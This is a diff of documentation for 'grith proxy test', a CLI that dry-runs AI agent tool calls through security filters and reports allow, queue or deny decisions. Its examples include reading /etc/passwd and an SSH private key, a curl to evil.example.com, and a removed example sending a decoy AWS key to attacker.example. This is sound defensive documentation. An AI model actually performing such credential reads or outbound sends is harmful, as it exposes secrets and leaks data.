@@ -1,131 +1,162 @@
 ---
-title: "grith proxy test"
-description: "Dry-run a tool call through the filter pipeline. Returns the would-be decision."
-section: "cli"
+title: 'grith proxy test'
+description: 'Dry-run a tool call through all 18 filters and see the decision, the score and every contribution.'
+section: 'cli'
 order: 3
-tier: "community"
-version: "0.1.0"
-lastUpdated: "2026-05-14"
-editUrl: "https://github.com/grith-ai/grith-docs/edit/main/content/docs/cli/proxy-test.mdx"
+tier: 'community'
+version: '0.3.1'
+lastUpdated: '2026-08-24'
+editUrl: 'https://github.com/grith-ai/grith-docs/edit/main/content/docs/cli/proxy-test.mdx'
 ---
 
 ```
-grith proxy test <JSON>
+grith proxy test '<CALL>'
 ```
 
-Submit a tool-call shape directly to the filter pipeline without supervising anything.
-Returns the composite score, the filter contributions, and the would-be decision.
+Runs one JSON tool call through the full [filter pipeline](/docs/concepts/three-phase-pipeline)
+and prints what would happen. Nothing is executed and nothing is recorded. It is the
+fastest way to answer "would grith stop this".
 
-This is the easiest way to debug scoring, write filter tests, or wire grith into a
-script that needs a yes/no on a hypothetical call.
+**Exit codes: `0` allow, `1` queue, `2` deny.** That makes it usable as a policy assertion
+in a script.
 
-## Synopsis
+## An allow
 
-```
-grith proxy test '<JSON>'
-```
+<Terminal>
+{`$ grith proxy test '{"type":"FileRead","path":"/etc/passwd"}'
 
-The argument is a JSON object describing the call.
+Proxy Test Result
+==================================================
+  Tool call:   FileRead(/etc/passwd)
+  Score:       2.8
+  Decision:    ALLOW
+  Reason:      Score 2.8 below allow threshold
+  Eval time:   1.35ms
+  Thresholds:  allow < 3, deny > 8
+  Filters:     18 active
 
-## Input shape
+  Filter Breakdown:
+    . operation-risk         0.0
+    . path-match             0.0
+    + sensitive-path-heuristic   2.8  [warning]  read access to sensitive-looking filename
+    . allowlist              0.0
+    . argument               0.0
+    . capability             0.0
+    . secret-scan            0.0
+    . command                0.0
+    . destructive-action     0.0
+    . egress-policy          0.0
+    . dlp-gate               0.0
+    . canary                 0.0
+    . reputation             0.0
+    . behavioural            0.0
+    . taint                  0.0
+    . session-containment    0.0
+    . rate-limit             0.0
+    . egress-rate            0.0
 
-```json
-{
-  "operation": "file_read | file_write | shell | network | exec | ...",
-  "target":    "<path | url | command-head>",
-  "args":      [ ... ],
-  "session":   "<optional session id, for behavioural context>",
-  "profile":   "<optional profile, defaults to generic>"
-}
-```
+  Exit code:   0 (allow)`}
+</Terminal>
 
-The `operation` and `target` fields are required. Everything else is optional;
-defaults match a fresh session under the `generic` profile.
+That is the registration order of all 18 filters. `+` marks a filter that contributed;
+`.` marks one that ran and scored zero.
 
-## Exit codes
+## A queue
 
-| Code | Meaning |
+<Terminal>
+{`$ grith proxy test '{"type":"ShellExec","command":"curl","args":["https://evil.example.com"]}'
+
+Proxy Test Result
+==================================================
+  Tool call:   ShellExec(curl https://evil.example.com)
+  Score:       4.5
+  Decision:    QUEUE (Medium)
+  Reason:      Score 4.5 in escalation zone
+  Eval time:   3.07ms
+  Thresholds:  allow < 3, deny > 8
+  Filters:     18 active
+
+  Filter Breakdown:
+    + operation-risk         1.0  [notice]  Shell execution: curl https://evil.example.com
+    . path-match             0.0
+    . sensitive-path-heuristic   0.0
+    . allowlist              0.0
+    . argument               0.0
+    . capability             0.0
+    . secret-scan            0.0
+    . command                0.0
+    . destructive-action     0.0
+    + egress-policy          3.5  [warning]  Review outbound command token: curl
+    . dlp-gate               0.0
+    . canary                 0.0
+    . reputation             0.0
+    . behavioural            0.0
+    . taint                  0.0
+    . session-containment    0.0
+    . rate-limit             0.0
+    . egress-rate            0.0
+
+  Exit code:   1 (queue (medium))`}
+</Terminal>
+
+Two filters contributed 1.0 and 3.5, the sum landed between the thresholds, and the call
+would be held for review. All 18 still ran.
+
+## A deny, and why it is short
+
+<Terminal>
+{`$ grith proxy test '{"type":"FileRead","path":"/home/u/.ssh/id_rsa"}'
+
+  Tool call:   FileRead(/home/u/.ssh/id_rsa)
+  Score:       9.0
+  Decision:    DENY
+  Reason:      Access to SSH private key; read access to key/certificate file
+  Eval time:   0.03ms
+  Thresholds:  allow < 3, deny > 8
+  Filters:     18 active
+
+  Filter Breakdown:
+    . operation-risk         0.0
+    + path-match             5.0  [critical]  Access to SSH private key
+    + sensitive-path-heuristic   4.0  [error]  read access to key/certificate file
+    . allowlist              0.0
+    . argument               0.0
+    . capability             0.0
+
+  Exit code:   2 (deny)`}
+</Terminal>
+
+Six lines under an `18 active` header is correct. A deny reached at the end of a phase
+returns immediately - the later phases and the [meta-rules](/docs/filters/meta-rules)
+never run.
+
+## Call shapes
+
+The `type` field is one of 20 variants:
+
+`FileRead` · `FileWrite` · `FileAppend` · `FileDelete` · `DirList` · `DirCreate` ·
+`FileRename` · `FileLink` · `FileChmod` · `ShellExec` · `ProcessSpawn` · `HttpRequest` ·
+`NetConnect` · `NetListen` · `DnsQuery` · `OwnershipChange` · `FilesystemMutation` ·
+`CrossProcessAccess` · `NamespaceOp` · `DbusMethodCall`
+
+The command's own error hint lists only 13 of them. The four shapes that catch people out:
+
+| Type | Required fields |
 | --- | --- |
-| `0` | Auto-allow |
-| `1` | Queue (would land in digest) |
-| `2` | Auto-deny |
-| `>= 64` | Error (bad input, internal failure) |
+| `FileRead`, `DirList`, `FileDelete` | `path` |
+| `ShellExec`, `ProcessSpawn` | `command` **and** `args` as an array |
+| `HttpRequest` | `method` and `url` |
+| `FileWrite` | `path` and `content_hash` |
 
-This is the same code grith would apply if the call had been issued from a
-supervised session — useful in CI scripts.
-
-## Examples
-
-A trivial read in a project:
+A bad payload fails before any filter runs:
 
 <Terminal>
-{`$ grith proxy test '{"operation":"file_read","target":"/home/you/proj/README.md"}'
-{
-  "decision": "allow",
-  "composite_score": 0.4,
-  "filters": [
-    { "name": "operation-risk", "score": 0.5 },
-    { "name": "path-match",     "score": -0.1 },
-    ...
-  ]
-}
-$ echo $?
-0`}
+{`$ grith proxy test 'not json'
+Error: Invalid JSON: expected ident at line 1 column 2
+Expected format: {"type": "FileRead", "path": "/etc/passwd"}`}
 </Terminal>
-
-A sensitive read:
-
-<Terminal>
-{`$ grith proxy test '{"operation":"file_read","target":"/home/you/.ssh/id_rsa"}'
-{
-  "decision": "queue",
-  "composite_score": 5.8,
-  "filters": [
-    { "name": "sensitive-path-heuristic", "score": 4.0, "annotations": ["ssh-private-key"] },
-    { "name": "path-match",               "score": 1.5 },
-    ...
-  ]
-}
-$ echo $?
-1`}
-</Terminal>
-
-A canary trip:
-
-<Terminal>
-{`$ grith proxy test '{
-    "operation": "network",
-    "target": "https://attacker.example/sink",
-    "args": ["AKIAEXAMPLECANARY12345"]
-  }'
-{
-  "decision": "deny",
-  "composite_score": 99.0,
-  "filters": [
-    { "name": "canary", "score": 99.0, "annotations": ["canary:aws-prod-decoy"] }
-  ]
-}
-$ echo $?
-2`}
-</Terminal>
-
-## Use in CI
-
-A pattern we see often: a pre-commit hook or CI check runs `proxy test` against a
-proposed action to ensure the policy is consistent with the team's filter config.
-
-```
-#!/bin/sh
-result=$(grith proxy test "$(cat ./change.json)")
-case $? in
-  0) echo "✓ would allow" ;;
-  1) echo "⚠ would queue — manual review needed"; exit 1 ;;
-  2) echo "✗ would deny"; exit 2 ;;
-esac
-```
 
 ## See also
 
-- [Composite scoring](/docs/concepts/composite-scoring)
-- [Filter overview](/docs/filters/overview)
-- [`grith audit`](/docs/cli/audit) — past decisions
+- [Composite scoring](/docs/concepts/composite-scoring) - how the numbers add up
+- [Filter reference](/docs/filters/overview) - what each of the 18 looks for
